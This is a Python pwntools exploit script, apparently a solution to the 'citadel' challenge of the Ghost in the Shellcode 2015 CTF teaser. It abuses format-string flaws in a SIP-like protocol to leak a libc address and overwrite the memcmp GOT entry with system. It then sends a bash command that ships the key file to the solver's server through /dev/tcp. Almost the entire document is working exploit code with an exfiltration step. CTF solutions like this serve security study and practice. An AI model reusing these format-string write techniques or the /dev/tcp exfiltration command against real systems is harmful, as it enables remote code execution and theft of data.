#!/usr/bin/env python
# coding=utf-8
# WARNING: EXTREMELY UGLY CODE, CTF TIME PRESSURE AND ALL THAT!
# Author: @skusec / http://gnoobz.com/gits-teaser-2015-ctf-citadel-writeup.html

from pwn import * # https://github.com/Gallopsled/pwntools
import time

# The IP and port of your server. The flag will be sent there.
server_ip = '13.33.33.37'
server_port = 9001

s = remote('citadel.2015.ghostintheshellcode.com', 5060)

# Direct parameter access indices.
ID1 = 87      # 87
ID2 = ID1 - 1 # 86
ID3 = ID1 - 5 # 82
ID4 = ID1 - 2 # 85

# Place the memcmp@got.plt address on the stack.
time.sleep(0.1)
s.send_raw('''REGISTER foo GITSSIP/0.1
To: %6369409c%''' + str(ID3) + '''$n..%''' + str(ID4) + '''$n
From: a
Expires: 0
Common Name: b
Contact: a

DIRECTORY * GITSSIP/0.1
Search: *
''')
time.sleep(1.0)

# Receive a lot of chunk from the large asprintf call.
# Lots of magic values in this code, I was in a hurry. ;)
recvd = 0
while recvd < 6369432:
  data = s.recv(6369532 - recvd)
  recvd += len(data)

# Leak the libc memcmp address.
time.sleep(0.1)
s.send_raw('''REGISTER foo GITSSIP/0.1
To: [[[%''' + str(ID1) + '''$s]]]
From: a
Expires: 0
Common Name: q
Contact: a

DIRECTORY * GITSSIP/0.1
Search: q
''')
time.sleep(1.0)

# Parse the address
buf = s.recv(1024)
address = buf.split('[[[')[1]
address = address.split(']]]')[0]
address = address.ljust(8, '\x00')
address = struct.unpack('<Q', address)[0]
system = address - 1156528
print('memcmp at: 0x%016x' % address)
print('system at: 0x%016x' % system)

# Split address.
syslower = system & 0xffff
syslower -= 23
sysupper = (system >> 16) & 0xffff
sysupper -= 23

# Write the system address into the memcmp@got.plt entry.
time.sleep(0.1)
s.send_raw('''REGISTER foo GITSSIP/0.1
To: %''' + str(sysupper) + '''c%''' + str(ID2) + '''$hn%''' + str(syslower - sysupper) + '''c%''' + str(ID1) + '''$hn
From: a
Expires: 0
Common Name: p
Contact: a

DIRECTORY * GITSSIP/0.1
Search: p
''')
time.sleep(1.0)

# Collect cookies.
s.send_raw('/bin/bash -c "cat key > /dev/tcp/%s/%s" # foo GITSSIP/0.1\n' % (server_ip, server_port))
print('Flag should be on its way!')
